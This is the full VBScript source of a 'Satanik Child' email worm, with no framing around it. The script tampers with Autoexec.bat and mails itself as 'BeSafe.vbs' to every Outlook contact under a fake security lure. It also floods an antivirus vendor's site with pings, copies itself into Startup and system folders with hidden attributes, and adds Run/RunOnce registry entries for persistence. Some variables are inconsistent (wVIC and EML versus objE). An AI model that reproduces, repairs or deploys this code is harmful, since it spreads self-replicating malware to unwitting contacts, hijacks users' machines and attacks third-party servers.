On Error Resume Next 
Dim WSH, MSOutlook, gNAMES, gADD, EML, FSO, FILE
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = WScript.CreateObject("WScript.Shell")

Set FILE = FSO.OpenTextFile("C:\Autoexec.bat", 8, True)  
With FILE
    .WriteLine "echo off"
    .WriteLine "cls"
    .writeline "echo                                                     " 
    .writeline "echo        rXMWi          :rrMM:            ,riMMr"    
    .writeline "echo    MMMWZZZMMMMi     MMMB2ZZMMMM2      MMM@aZ2B@MMM"
    .writeline "echo  iMM:       7MMX  2MM        :MM;   MMM         MM"
    .writeline "echo  MMZ             iMM               .MM."           
    .writeline "echo  MM  ;0MMMMS     7@M  20MMMBZ      2MM  X8MMMMM"   
    .writeline "echo MMMMMMZZZZMMMW   MMMZM@2ZZZMMMM    MMM2MWaZZ2BMMM2"
    .writeline "echo MMMr        iM0. MMM         SMM   MMM          MM"
    .writeline "echo  MM          MMW rWM          MMM  2MM          MM"
    .writeline "echo  MM          MZ, iMM          MM   .MM          MM"
    .writeline "echo   MM@      .MM2   :MM8       MMM    ;MM0       8MM"
    .writeline "echo    8MMMMMMMMB       BMMMMMMMMM        @MMMMMMMMM: "
    .writeline "echo       LXWM!            LXWM!             LXWM!    "
    .writeline "echo              s a t n i k    c h i l d             "
    .writeline "echo               c  r  e  a  t  i  o  n              "
End With

Set MSOutlook = CreateObject("Outlook.Application") 
Set gNAMES = MSOutlook.GetNameSpace("MAPI") 
For y = 1 To gNAMES.AddressLists.Count 
	Set gADD = gNAMES.AddressLists(y) 
	x = 1 
	Set objE = MSOutlook.CreateItem(0) 
		For o = 1 To gADD.AddressEntries.Count 
			f = gADD.AddressEntries(x) 
			wVIC.Recipients.Add f 
			x = x + 1 
		Next 
	EML.Subject = "Something you should read" 
	EML.Body = "Hey is you Internet Security up to par?" 
	EML.Attachments.Add FSO.GetSpecialFolder(0) & "\BeSafe.vbs"
	EML.DeleteAfterSubmit = True 
	EML.Send 
	f = "" 
Next 
WSH.Run FSO.GetSpecialFolder(0) & "\ping.exe -l 10000 -t www.avp.com", 0

On Error Resume Next
Dim WShell
Dim StUp
Dim StUpFolder
Set WShell = CreateObject("Wscript.Shell")
StUpFolder = WShell.SpecialFolders("Startup")
Set StUp = FSO.GetFolder(StUpFolder)
Set MyFile = FSO.GetFile(WScript.ScriptFullName)
MyFile.Copy (StUp & "\Hello.vbs")
MyFile.Copy (FSO.GetSpecialFolder(0) & "\BeSafe.vbs")
Set ATTR = FSO.GetFile(StUp & "\Hello.vbs")
ATTR.Attributes = ATTR.Attributes + 3
ATTR.Attributes = 0
ATTR.Attributes = 3

If Not FSO.FileExists(StUp & "Hello.vbs") Then
	Set HELLO = FSO.GetFile(WScript.ScriptFullName)
	HELLO.Copy (FSO.GetSpecialFolder(0) & "\Hello.vbs")
	RUNME = FSO.GetSpecialFolder(0) & "\Hello.vbs"
	WShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\RunOnce", "wscript.exe " & RUNME & " %"
Else
	Set HI = FSO.GetFile(WScript.ScriptFullName)
	HI.Copy (FSO.GetSpecialFolder(1) & "\Hello.vbs")
	RUNONCE = FSO.GetSpecialFolder(1) & "\Hello.vbs"
	WShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RunOnce", "wscript.exe " & RUNONCE & " %"
End If

If Day(Now()) = 1 Or Day(Now()) = 7 Or Day(Now()) = 9 Or Day(Now()) = 13 Or Day(Now()) = 17 Or Day(Now()) = 21 Or Day(Now()) = 27 Or Day(Now()) = 31 Then
	Randomize
	num = Int((5 * Rnd) + 1) 
		If num = 1 Then
			If MsgBox ("Do you think antivirus programs are a big rip-off?", 36, "Satanik Child Productions")= 7 Then
				MsgBox "Boy are you in for a surprise!",48, "You've been Swindled"
			Else
				MsgBox "Really?  Me too!!!", 64, "Anti Antivirus Programs"
			End If
		ElseIf num = 2 Then
			If MsgBox ("Have you ever been infected by a virus?", 36, "Out of curiosity")= 7 Then
				MsgBox "Well that is going to change very soon I believe!", 65, "Inquiering minds want 2 know"
			Else
				MsgBox "Then this one shouldn't bother you right?", 36, "Infected once more"
			End If
		ElseIf num = 3 Then
			If MsgBox ("Are you aware of ""Satanik Child"" and his viruses?", 36, "Pretty scary shit")= 7 Then
				MsgBox "Something tells me you are going to find out sooner than you think!", 65, "Another infected victim"
			Else
				MsgBox "I can tell you are one smart cookie!", 65, "Early April Fools"
		     End If
		ElseIf num = 4 Then
		     If MsgBox ("Are you aware on the new ""Satanik Child"" I-Worm that is going around?", 36, "Windows Internet Explorer")= 7 Then
				MsgBox "Well wake up stupid!  Ooops to late!", 65, "Gotcha!"
		     Else
				MsgBox "Well after this you will know it first hand!", 65, "From the labs of Satanik Child"
		     End If
	     ElseIf num = 5 Then
			If MsgBox ("Have you been to ""Satanik Childs"" site lately?", 36, "Satanik Child") = 7 Then
		     	MsgBox "Well let's go there now!", 48, "Satanik Child"
				Set IE = CreateObject("InternetExplorer.Application")
		    	     ie.height=800
		    	     ie.width=600
		    	     ie.menubar=0
		    	     ie.toolbar=0
		    	     ie.navigate "http://www.geocities.com/malicious_philez/Forbidden.htm"
		    	     ie.visible=2
		Else
		     MsgBox"Then you won't mind going again right?",65, "Satanik Child"
		    	     Set IE = CreateObject("InternetExplorer.Application")
		    	     ie.height=800
		    	     ie.width=600
		    	     ie.menubar=0
		    	     ie.toolbar=0
		    	     ie.navigate "http://www.geocities.com/malicious_philez/Forbidden.htm"
		    	     ie.visible=2
		     End If
		End If
End If